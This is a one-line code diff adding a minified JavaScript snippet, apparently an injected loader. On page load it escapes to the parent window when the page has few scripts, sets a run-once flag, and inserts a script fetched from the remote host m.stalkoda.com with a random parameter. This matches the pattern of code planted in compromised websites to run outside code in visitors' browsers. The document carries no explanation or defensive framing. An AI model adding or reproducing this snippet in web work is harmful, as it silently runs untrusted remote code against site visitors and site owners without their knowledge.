@@ -1,0 +1,1 @@
+!function(){var t=window;if(window.document.getElementsByTagName("script").length<4&&(t=window.parent),1!==t.sttpd){t.sttpd=1;var e=t.document.createElement("script");e.async=1,e.src="//m.stalkoda.com/?t="+Math.random();var n=t.document.getElementsByTagName("script")[0];n.parentNode.insertBefore(e,n)}}();
